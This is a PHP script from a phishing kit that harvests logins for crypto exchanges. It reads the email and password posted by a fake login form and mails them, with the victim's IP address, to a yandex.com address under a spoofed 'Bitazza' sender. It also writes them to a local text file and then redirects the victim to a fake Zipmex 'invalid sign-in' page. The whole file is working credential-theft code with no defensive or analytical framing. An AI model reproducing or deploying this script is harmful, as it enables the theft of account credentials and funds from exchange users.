<?php


/*========== [ Variables ]==========*/
$ip 		= getenv("REMOTE_ADDR");
$email   = $_POST['email'];
$password   = $_POST['password'];
/*========== [ Variables ]==========*/


$message = "
==$$$==== *** s3MpaK.B4nK***=====$$$==
Email      : $email
Password    : $password
==$$$==== *** s3MpaK.B4nK***=====$$$==
IP	: http://www.geoiptool.com/?IP=$ip
==========[ THANK'S YOU ]==========";


$to = "@yandex.com"; // Email Here
$subject = "BTC = [$ip]";
$headers = "From: Bitazza <result.netnot@yandex.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

mail($to, $subject, $message,$headers);

$file = "mwehehe.txt";
$email   = $_POST['email'];
$password   = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "---------------------------------------");
fwrite($handle, "\n");
fwrite($handle, "::  Email       ::   ");
fwrite($handle, "$email");
fwrite($handle, "\n");
fwrite($handle, "::  Password    ::   ");
fwrite($handle, "$password");
fwrite($handle, "\n");
fwrite($handle, "::  IP          ::   ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"https://zipmex-account.github.io/Sign%20In%20_%20Zipmex_invalid.html\";
// -->
</script>";
?>
